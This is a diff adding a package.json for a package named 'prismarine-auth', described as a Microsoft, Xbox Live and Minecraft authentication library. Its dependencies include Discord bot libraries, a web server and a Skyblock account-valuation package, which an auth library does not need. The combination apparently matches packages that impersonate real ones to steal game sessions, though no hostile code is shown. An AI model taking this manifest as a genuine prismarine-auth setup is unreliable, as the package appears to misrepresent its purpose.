@@ -1,0 +1,47 @@
+{
+  "name": "prismarine-auth",
+  "version": "2.3.0",
+  "description": "Authentication library for Microsoft, Xbox Live, and Minecraft with caching support",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/PrismarineJS/prismarine-auth.git"
+  },
+  "keywords": [
+    "prismarine",
+    "template"
+  ],
+  "author": "Romain Beaumont",
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/PrismarineJS/prismarine-auth/issues"
+  },
+  "homepage": "https://github.com/PrismarineJS/prismarine-auth#readme",
+  "devDependencies": {
+    "chai": "^4.3.4",
+    "chai-as-promised": "^7.1.1",
+    "mocha": "^10.0.0",
+    "nodemon": "^2.0.22",
+    "prismarine-auth": "file:.",
+    "standard": "^17.0.0"
+  },
+  "dependencies": {
+    "@azure/msal-node": "^2.0.2",
+    "@xboxreplay/xboxlive-auth": "^3.3.3",
+    "debug": "^4.3.3",
+    "discord": "^0.8.2",
+    "discord.js": "^14.13.0",
+    "ejs": "^3.1.7",
+    "express": "^4.17.1",
+    "fs": "0.0.1-security",
+    "jose": "^4.1.4",
+    "node-fetch": "^2.6.1",
+    "nodemon": "^2.0.22",
+    "skyhelper-networth": "^1.16.5",
+    "smart-buffer": "^4.1.0",
+    "uuid-1345": "^1.0.2"
+  }
+}
